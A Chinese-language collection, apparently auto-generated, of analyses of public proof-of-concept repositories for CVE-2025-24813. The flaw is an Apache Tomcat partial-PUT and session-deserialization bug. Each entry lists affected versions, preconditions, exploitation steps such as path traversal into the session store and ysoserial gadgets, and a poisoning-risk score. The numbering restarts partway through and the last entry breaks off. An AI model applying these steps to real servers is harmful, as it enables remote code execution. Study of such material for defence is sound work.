**项目地址:** [threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat](https://github.com/threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #47

**来源**: [CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：1. writes enabled for the default servlet (默认禁用); 2. 支持 partial PUT (默认启用); 3. 使用 Tomcat 的 file based session persistence 和默认存储位置; 4. 应用包含一个可能被用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 远程代码执行漏洞，利用了 Tomcat 处理部分 PUT 请求的方式。攻击者可以通过上传恶意构造的文件（利用 Ysoserial 生成反序列化 payload）到 Tomcat 服务器，然后通过 GET 请求触发反序列化，从而执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索引擎结果（Rapid7, GreyNoise, socprime 等）以及提供的 POC 代码，可以判断该漏洞是有效的，并且已经被观察到在野利用。POC 代码通过生成多种 Ysoserial payload 并尝试上传，增加了漏洞利用成功的概率。

**投毒风险分析：**

分析提供的 POC 代码，发现其主要功能是利用 ysoserial 生成反序列化 payload，然后通过 PUT 和 GET 请求触发漏洞。代码本身没有明显的恶意行为，例如向其他服务器发送信息或篡改本地文件。主要风险在于使用未经验证的第三方库（ysoserial），这本身可能存在安全风险，但是这是漏洞利用本身的一部分，而不是作者额外添加的恶意代码。

评估投毒风险较低，约为5%。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 服务器需要满足特定配置条件，包括开启了 default servlet 的写入权限，支持 partial PUT，并且应用使用了 Tomcat 的文件会话持久化功能，且包含可被利用的反序列化库。
2.  **生成 Payload：** 使用 ysoserial 工具生成包含恶意命令的反序列化 payload。POC 代码支持批量生成不同 gadget chain 的 payload，提高成功率。
3.  **PUT 请求：** 通过 PUT 请求，将生成的 payload 分段上传到目标 Tomcat 服务器。利用 Content-Range 头部模拟 partial PUT 请求。
4.  **GET 请求：** 通过 GET 请求，触发 Tomcat 对上传文件的反序列化操作，从而执行恶意代码。
5.  **执行命令：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意命令。

**项目地址:** [tonyarris/CVE-2025-24813-PoC](https://github.com/tonyarris/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #48

**来源**: [CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md](../2025/CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入(disabled by default), 支持partial PUT(enabled by default), application 使用了Tomcat基于文件的session持久化，使用了默认的存储位置，并且application包含可被反序列化攻击利用的library。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，可能导致远程代码执行和/或信息泄露。该漏洞的根源在于对文件名的处理方式，特别是内部点（'file.Name'）。

**漏洞利用方式分析：**

根据漏洞库信息和搜索结果，该漏洞存在两种利用方式：

1.  **信息泄露/恶意内容注入：** 如果满足以下条件，攻击者能够查看敏感文件或注入恶意内容：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   目标URL是公共上传URL的子目录。
    *   攻击者知道敏感文件名。
    *   使用 partial PUT 上传敏感文件。

2.  **远程代码执行（RCE）：** 如果满足以下条件，攻击者能够执行任意代码：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   应用程序使用Tomcat的基于文件的session持久化，并使用默认存储位置。
    *   应用程序包含一个可以用于反序列化攻击的library。

**POC 代码分析：**

POC代码`CVE_2025_24813.py`实现了以下功能：

1.  **检查Servlet是否可写：** 使用PUT请求向目标URL上传文件，检查HTTP响应状态码，以确定服务器是否允许写入。
2.  **生成ysoserial payload：** 使用ysoserial工具生成反序列化payload，需要指定命令、ysoserial路径和gadget。
3.  **生成Java payload：**  生成一个简单的java文件, 然后通过javac编译为class文件, 再打包为jar文件。
4.  **上传和验证payload：** 上传生成的payload到Tomcat服务器, 利用路径穿越漏洞，覆盖session文件，从而执行代码。

**有效性评估：**

根据搜索结果，CVE-2025-24813漏洞正在被积极利用。POC代码涵盖了漏洞利用的关键步骤，包括写入性验证、payload生成和上传，因此可以认为是有效的，但利用成功与否取决于目标环境是否满足利用条件。

**投毒风险评估：**

通过分析POC代码，发现存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖外部工具ysoserial：**  POC代码依赖于ysoserial工具生成反序列化payload。虽然ysoserial是一个常用的漏洞利用工具，但如果用户下载了被篡改的ysoserial版本，可能会执行恶意代码。虽然POC本身没有直接植入恶意代码，但依赖的外部资源存在被投毒的风险。
2.  **执行任意命令：**  该脚本允许执行任意命令。如果攻击者控制了用户运行脚本的环境，可以修改脚本，执行恶意的系统命令，从而控制目标系统。

综合考虑，该POC代码的投毒风险较低，约为5%。大部分代码是用于漏洞利用，风险主要来源于对外部依赖的信任和对执行环境的控制。


**项目地址:** [u238/Tomcat-CVE_2025_24813](https://github.com/u238/Tomcat-CVE_2025_24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #49

**来源**: [CVE-2025-24813-uzairhaider502_CVE-2025-24813.md](../2025/CVE-2025-24813-uzairhaider502_CVE-2025-24813.md)

# CVE-2025-24813

> 📦 该CVE有 **52** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-24813-137f_Poc-CVE-2025-24813.md](../2025/CVE-2025-24813-137f_Poc-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 开启Partial PUT (默认开启), 应用使用基于文件的session持久化(默认位置), 应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，利用了路径等价性（内部点，例如 `file.Name`）结合启用了写入功能的默认 Servlet 和 Partial PUT 功能。该漏洞可能导致远程代码执行（RCE）、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用方式:**

1.  **前提条件:** 漏洞利用需要满足以下条件：
    *   默认 Servlet 开启写入 (disabled by default).
    *   支持 Partial PUT (enabled by default).
    *   对于RCE，应用需要使用 Tomcat 基于文件的 session 持久化，并且包含一个可以被反序列化攻击利用的库（例如，存在于classpath中的commons-collections）。
    *   对于信息泄露/文件篡改，需要攻击者了解敏感文件的上传目标 URL 位于公共上传目标 URL 的子目录下，且攻击者需要知道上传的敏感文件名，且敏感文件通过partial PUT上传。
2.  **漏洞利用步骤:**
    *   **获取 Session ID:** 攻击者首先需要获取一个有效的 JSESSIONID，可以通过访问 `/index.jsp` 获取，如果无法获取则使用默认值。
    *   **测试 PUT 方法:** 攻击者发送一个 PUT 请求来确认目标服务器是否允许使用 `Content-Range` 进行部分写入。
    *   **生成 Payload:**  攻击者使用 `ysoserial` 或者 Java 代码生成一个恶意的序列化对象。`ysoserial` 通过指定的 gadget（例如 `CommonsCollections6`）来执行命令。也可以生成一个包含恶意命令执行的Java .jar文件。
    *   **上传 Payload:**  攻击者利用路径遍历将 payload 上传到 Tomcat 的 session 目录。例如，`/uploads/../sessions/{JSESSIONID}.session`。
    *   **触发执行:**  攻击者使用包含恶意 JSESSIONID 的请求来访问应用程序。Tomcat 将会反序列化该 session 文件，从而执行攻击者注入的命令。

**有效性:**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞的 POC 代码**有效**。搜索结果中提到了该漏洞已被积极利用。提供的 POC 代码包含利用该漏洞进行 RCE 的 Python 脚本，并提供了详细的利用步骤和参数说明。

**投毒风险:**

评估提供的 POC 代码，投毒风险较低，约为 **10%**。主要考虑因素如下：

*   **代码结构:** 代码结构较为清晰，主要分为获取 Session ID、验证 PUT 方法、生成 Payload 和发送 Payload 等几个模块。
*   **依赖项:**  代码依赖 `ysoserial.jar`，这本身是一个已知的漏洞利用工具，如果攻击者替换了 `ysoserial.jar` 文件，则可能引入恶意代码。此外，java payload方式需要服务器具有java编译环境。
*   **潜在风险:**  `java_payload` 函数中使用 `Runtime.getRuntime().exec(c)` 直接执行命令，如果命令字符串 `cmd` 构造不当，可能会存在命令注入的风险。
*   **作者声明:**  README 文件中包含免责声明，说明该代码仅用于教育目的，这在一定程度上降低了作者进行恶意投毒的可能性。

总的来说，虽然代码本身看起来没有明显的恶意行为，但仍然需要谨慎使用，并确保从可信的来源获取 `ysoserial.jar`，并仔细检查命令字符串，避免引入额外的安全风险。 java payload方式需要服务器具有java编译环境,具有一定局限性。

**项目地址:** [137f/Poc-CVE-2025-24813](https://github.com/137f/Poc-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #2

**来源**: [CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露，文件被篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足特定配置条件，包括启用Default Servlet的写入功能，启用partial PUT支持，存在安全敏感文件上传的目标URL位于公共上传目标URL的子目录中，攻击者已知安全敏感文件的名称，以及安全敏感文件通过partial PUT上传。或者，启用Default Servlet的写入功能，启用partial PUT支持，应用程序使用Tomcat基于文件的会话持久性与默认存储位置，应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息，CVE-2025-24813 涉及 Apache Tomcat 的路径等效问题，可能导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。利用条件包括Default Servlet启用了写入，支持partial PUT，以及应用程序的特定配置。搜索引擎结果显示，该漏洞已被公开并被积极利用。

提供的 POC 代码尝试利用该漏洞。它首先使用 `argparse` 处理目标 URL 参数。然后，它包含一段 base64 编码的 payload，该 payload 是一个经过序列化的 Java 对象，旨在执行命令 `touch /tmp/RCE-success`。  该脚本将解码后的payload保存到`decoded_chain.bin`文件中。 然后，使用 `requests.put` 函数，通过构造包含 'Content-Range' 头部的 PUT 请求，利用 Tomcat 的 partial PUT 功能，将payload上传到目标服务器。PUT请求的目标URL是`TARGET_IP/payload.session`。脚本上传完成后删除临时文件。 最后使用Cookie进行getSession。

**有效性评估：** POC 的有效性取决于目标 Tomcat 服务器是否满足漏洞利用的全部条件。如果 Default Servlet 的写入已启用，并且启用了 partial PUT 支持，并且满足其他条件，则 POC 可能有效。

**投毒风险评估：** 仔细检查提供的 POC 代码，没有发现明显的投毒代码。该代码旨在利用已知的 Tomcat 漏洞，而不是在目标系统上植入后门或执行恶意操作。 代码中包含的base64编码的payload部分是最有可能存在风险的部分，但是payload中的命令是`touch /tmp/RCE-success`，该命令仅仅是创建一个文件，用于验证漏洞是否存在，并非恶意操作。

**利用方式总结：**

1.  **条件确认:** 确认目标 Tomcat 服务器启用了 Default Servlet 的写入功能，并启用了 partial PUT 支持，以及是否满足其他相关条件。
2.  **Payload 生成:**  生成一个恶意 Java 序列化对象，该对象可以执行任意代码，或者读取敏感文件。
3.  **Partial PUT 上传:**  使用 HTTP PUT 请求，通过设置 `Content-Range` 头部，将恶意 payload 分块上传到目标服务器上的特定路径（例如，`payload.session`）。
4.  **触发反序列化：**  Tomcat 尝试反序列化上传的文件，从而触发恶意代码的执行。


**项目地址:** [Alaatk/CVE-2025-24813-POC](https://github.com/Alaatk/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #3

**来源**: [CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md](../2025/CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：默认Servlet开启写入 (默认关闭)，支持Partial PUT (默认开启)，存在安全敏感文件的目标URL是公共上传目标URL的子目录，攻击者知晓敏感文件名，安全敏感文件通过Partial PUT上传，或应用程序使用Tomcat文件会话持久性（默认位置），应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞。该漏洞允许攻击者通过精心构造的包含内部点（file.Name）的文件名，利用默认Servlet中启用的写入功能和Partial PUT支持，进行远程代码执行、信息泄露和恶意内容注入。根据漏洞描述，攻击成功的关键在于Tomcat的配置以及应用程序是否使用了易受攻击的组件。

**有效性：** 从搜索结果来看，该漏洞已被确认存在并且有在野利用。但是，漏洞利用需要满足多个非默认配置条件，因此并非所有Tomcat实例都易受攻击。提供的POC代码 `/tmp/9a20e2370d216dc00af3f4d6145c600e/README.md` 内容过于简单，仅包含CVE编号，并不能直接用于漏洞利用，需要根据具体情况编写特定的利用代码，例如构造恶意的PUT请求。

**投毒风险：** 提供的POC代码非常简单，主要就是包含 CVE-2025-24813 的 README.md 文件。因此，投毒风险很低，但是不排除作者在其他相关文件中隐藏恶意代码的可能性，只是没有在此次提交中呈现，考虑到文件数量极少,故判断存在10%的投毒风险。

**利用方式：** 漏洞利用主要通过以下步骤：

1.  **利用Partial PUT上传恶意文件：** 攻击者构造包含内部点的文件名，并通过Partial PUT请求将其上传到目标服务器。
2.  **绕过路径检查：** 由于路径等价性问题，Tomcat可能无法正确处理包含内部点的文件名，导致绕过路径检查。
3.  **信息泄露/恶意内容注入：** 如果目标是信息泄露或恶意内容注入，攻击者需要知道目标敏感文件的名称和路径，然后通过覆盖或修改该文件来实现目的。
4.  **远程代码执行：** 如果应用程序使用了Tomcat的文件会话持久性，并且包含可用于反序列化攻击的库，攻击者可以利用该漏洞将恶意序列化对象写入会话文件，从而实现远程代码执行。攻击者可能会覆盖session文件，然后触发反序列化。

**总结：** CVE-2025-24813 是一个高危漏洞，但是利用条件较为苛刻。 提供的POC代码过于简单，无法直接用于攻击，需要根据目标环境进行定制。在实际环境中，需要仔细评估Tomcat的配置和应用程序的安全性，以确定是否存在被利用的风险。同时需要关注针对该漏洞的攻击尝试并及时采取缓解措施，例如禁用默认Servlet的写入功能或升级到修复版本。

**项目地址:** [AlperenY-cs/CVE-2025-24813](https://github.com/AlperenY-cs/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #4

**来源**: [CVE-2025-24813-AsaL1n_CVE-2025-24813.md](../2025/CVE-2025-24813-AsaL1n_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危 (取决于配置和利用方式，可能导致RCE、敏感信息泄露或文件内容篡改)

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** RCE需要满足以下条件：writes enabled for default servlet, support for partial PUT, 使用Tomcat文件session持久化默认位置, 应用包含可被反序列化攻击利用的库。信息泄露/内容篡改需要满足以下条件：writes enabled for default servlet, support for partial PUT, security sensitive上传URL是公共上传URL的子目录, 攻击者知道security sensitive文件的名字, security sensitive文件也是通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是一个Apache Tomcat中的路径等价性漏洞，源于对文件名中内部点（'file.Name'）处理不当。根据漏洞描述和搜索结果，此漏洞在特定配置下可能导致远程代码执行（RCE）、信息泄露或恶意内容被添加到上传文件中。

**有效性：**
根据搜索引擎结果和漏洞描述，该漏洞已被积极利用。提供的PoC代码利用了Tomcat的partial PUT特性以及session持久化机制（在满足一定条件下），尝试通过上传恶意序列化数据来实现RCE。

**利用方式：**
1.  **前提条件：**
    *   Tomcat的default servlet需要开启写入功能（默认关闭）。
    *   需要启用partial PUT支持（默认开启）。
    *   （RCE）应用使用Tomcat的文件session持久化，且为默认存储位置。
    *   （RCE）应用包含可被反序列化攻击利用的库，例如存在fastjson, jackson等。
    *   （信息泄露/内容篡改）存在安全敏感文件上传URL是公共上传URL的子目录， 且攻击者知道该敏感文件名。
2.  **攻击步骤：**
    *   攻击者构造一个恶意的序列化对象，对其进行Base64编码（PoC中`-d/--data` 参数）。
    *   攻击者指定目标URL（PoC中`-u/--url` 参数）。
    *   PoC脚本首先向目标URL发送PUT请求，其中`Content-Range`头指定了上传的范围，利用Tomcat的partial PUT特性。
    *   如果服务器返回409状态码，则表示partial PUT已成功处理。
    *   之后，PoC脚本会发送GET请求，并携带包含恶意序列化数据的JSESSIONID cookie（`.{random_str}`）。
    *   Tomcat反序列化session数据，从而触发RCE (如果满足RCE条件)。

**投毒风险：**
分析提供的PoC代码和Readme，可以发现：
*   脚本本身的功能是利用漏洞进行攻击。
*   脚本中没有发现明显的恶意代码，例如植入后门、篡改系统文件等。
*   脚本需要用户提供Base64编码的序列化数据，这意味着攻击者需要自行生成payload，脚本只是负责发送payload。
*   Readme中指明了利用方式及所需条件，较为详细。

因此，该仓库中存在作者隐藏的恶意代码的可能性较低，但不能完全排除。投毒风险评估为 10%。风险主要在于用户可能下载了被篡改过的poc，或者运行了来历不明的payload, 这些payload可能包含恶意行为。

**项目地址:** [AsaL1n/CVE-2025-24813](https://github.com/AsaL1n/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #5

**来源**: [CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露和文件被恶意修改

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (Tomcat 默认支持), 文件会话持久化启用 (context.xml 配置 PersistentManager 和 FileStore), 存在反序列化利用链 (类路径下包含存在漏洞的库)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，该漏洞源于 'file.Name' (内部点) 的处理不当。如果满足以下所有条件，则可能导致远程代码执行，信息泄露或文件篡改：

1.  **DefaultServlet 写入功能启用：** 必须在 `web.xml` 中配置 `readonly=false`，允许 DefaultServlet 写入文件。
2.  **Partial PUT 请求支持：** Tomcat 默认支持分块上传，允许攻击者通过分块上传恶意文件。
3.  **文件会话持久化启用：** 需要在 `context.xml` 中配置 `PersistentManager` 和 `FileStore`，启用基于文件的会话存储。
4.  **存在反序列化利用链：** 类路径下需要包含存在漏洞的库（例如，`commons-collections-3.2.1.jar`），使得攻击者可以通过反序列化漏洞执行任意代码。
5.  **信息泄露/文件篡改的先决条件:** 除了上述条件外，还需要满足：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**利用方式：**

1.  攻击者首先利用 Partial PUT 请求上传一个恶意构造的序列化对象，该对象包含一个反序列化利用链（例如，使用 Commons Collections）。
2.  由于启用了 DefaultServlet 的写入功能，恶意文件可以被写入到 Tomcat 的会话存储目录中。
3.  当 Tomcat 尝试反序列化该会话时，由于存在利用链，攻击者可以执行任意代码。
4. 若目标满足信息泄露/文件篡改的先决条件,攻击者可以通过构造恶意的Partial PUT请求，利用路径等价绕过限制，最终实现信息泄露或者文件篡改

**投毒风险分析：**

该POC代码提供了一个 Docker Compose 文件，用于搭建易受攻击的 Tomcat 环境。该环境配置了必要的组件（DefaultServlet 写入，Partial PUT，文件会话持久化），并且包含了一个 Commons Collections 库，可以用于反序列化攻击。

代码本身看起来是直接了当的漏洞演示。投毒风险较低，但是使用该POC时仍需注意。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的利用代码来看，该漏洞已经确认被利用，并且相关的利用方式和利用条件已经比较清晰。提供的POC代码针对的是 RCE 部分，有效性较高，但成功利用取决于是否满足所有前提条件。

**项目地址:** [B1gN0Se/Tomcat-CVE-2025-24813](https://github.com/B1gN0Se/Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #6

**来源**: [CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence/Partial PUT RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/Partial PUT远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet启用写入(默认禁用)，启用Partial PUT(默认启用)，目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且通过Partial PUT上传敏感文件。RCE还需要应用程序使用Tomcat的文件会话持久性，以及存在可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合启用了写入功能的默认Servlet和Partial PUT功能，可能导致远程代码执行和敏感信息泄露。漏洞利用方式如下：

1.  **信息泄露/内容注入:** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   目标URL是公共上传URL的子目录
    *   攻击者知道敏感文件名
    *   通过Partial PUT上传敏感文件
攻击者可以查看敏感文件或向其中注入恶意内容。

2.  **远程代码执行 (RCE):** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   应用程序使用Tomcat的文件会话持久性，且使用默认存储位置
    *   应用程序包含可利用的反序列化库
攻击者可以通过上传恶意序列化session文件，利用反序列化漏洞执行任意代码。

**有效性：**
根据搜索结果，CVE-2025-24813漏洞存在活跃的利用。PoC代码的README描述了一个基本的利用流程，包括克隆仓库、安装依赖、运行PoC脚本，表明该PoC可能有效，但具体利用成功与否取决于目标环境的配置是否满足漏洞利用条件。PoC的有效性较高，因为搜索结果显示该漏洞正在被积极利用。

**投毒风险：**
分析提供的PoC代码（README.md），投毒风险较低。README.md文件只包含漏洞描述、环境配置、使用方法和免责声明。虽然PoC代码没有直接展示`poc.py`的内容，但是根据描述`poc.py`脚本会提示用户输入目标URL，表明其功能是针对目标进行漏洞验证而非植入后门。当然，`poc.py`本身可能包含恶意代码。在没有查看 `poc.py` 的内容的情况下，预估`poc.py`存在投毒代码的可能性较低，大约10%。主要考虑到以下几点：

*   PoC旨在验证漏洞的存在，而非长期控制目标系统。
*   公开的PoC代码通常会接受安全社区的审查，增加投毒的难度。
*   作者声明仅用于教育和研究目的。

**利用方式总结：**
攻击者利用此漏洞的方式是，首先需要满足前置条件（Default Servlet开启写入、Partial PUT启用等）。然后，通过构造恶意的PUT请求，并利用路径等价，覆盖或者修改敏感文件，实现信息泄露或RCE。RCE场景依赖于反序列化漏洞的利用，需要上传精心构造的恶意序列化数据。

**项目地址:** [CEAlbez/CVE-2025-24813-PoC](https://github.com/CEAlbez/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #7

**来源**: [CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md](../2025/CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 1. 默认Servlet开启了写入 (默认禁用)
2. 支持Partial PUT (默认启用)
3. 应用使用Tomcat基于文件的Session持久化, 使用默认存储位置
4. 应用包含可被反序列化攻击利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用 'file.Name' (内部点) 来实现远程代码执行和/或信息泄露，以及/或通过启用了写入的默认 Servlet 向上传的文件添加恶意内容。

**漏洞利用方式：**
1.  **信息泄露/恶意内容添加：**  如果满足以下条件，攻击者可以查看安全敏感文件或向其中注入内容：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   通过 Partial PUT 上传安全敏感文件。

2.  **远程代码执行：**  如果满足以下条件，攻击者可以执行远程代码：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的会话持久性，并且使用默认的存储位置。
    *   应用程序包含一个可以用于反序列化攻击的库。

**POC分析：**
POC利用脚本`CVE_2025_24813.py`的利用流程大概如下：
1.  检查目标服务器的默认servlet是否开启PUT方法，主要通过PUT请求上传一个文件来判断.
2.  如果目标开启了PUT方法，则会生成一个ysoserial的payload，指定gadget和要执行的命令.
3.  然后将payload上传到`target_url/uploads/../sessions/{session_id}.session`，session_id是由参数指定

**投毒风险分析：**
*   脚本主要功能是漏洞利用，没有发现明显的恶意代码。
*   脚本会生成payload并上传，这个过程可能存在一定风险，但主要取决于执行的命令和payload的内容，而非脚本本身。
*  脚本中存在一些临时文件创建，然后删除的操作，例如`Exploit.java`, `Exploit.class`，这些是payload构造过程中的正常步骤，但如果删除失败，可能会在服务器上留下痕迹。
*  脚本有生成java payload的逻辑，但是java payload的生成是直接拼接字符串，命令在字符串中比较明显，不太容易做手脚。
*  考虑到ysoserial payload本身就可能被认为是具有潜在危害，因此将投毒风险评估为5%。主要是payload本身可能存在的潜在风险。

**结论：**
提供的POC代码看起来是有效的，如果目标环境满足漏洞利用的条件，可以成功执行命令。投毒风险较低，主要风险在于利用过程中生成的payload可能带来的危害。

**项目地址:** [Eduardo-hardvester/CVE-2025-24813](https://github.com/Eduardo-hardvester/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #8

**来源**: [CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md](../2025/CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md)

## CVE-2025-24813-Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 写入已启用默认Servlet,支持部分PUT,针对敏感上传的URL是公共上传URL的子目录,攻击者了解正在上传的安全敏感文件的名称,安全敏感文件也通过部分PUT上传. 或 写入已启用默认Servlet,支持部分PUT,应用程序使用Tomcat基于文件的会话持久化，使用默认存储位置,应用程序包含可能在反序列化攻击中被利用的库

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

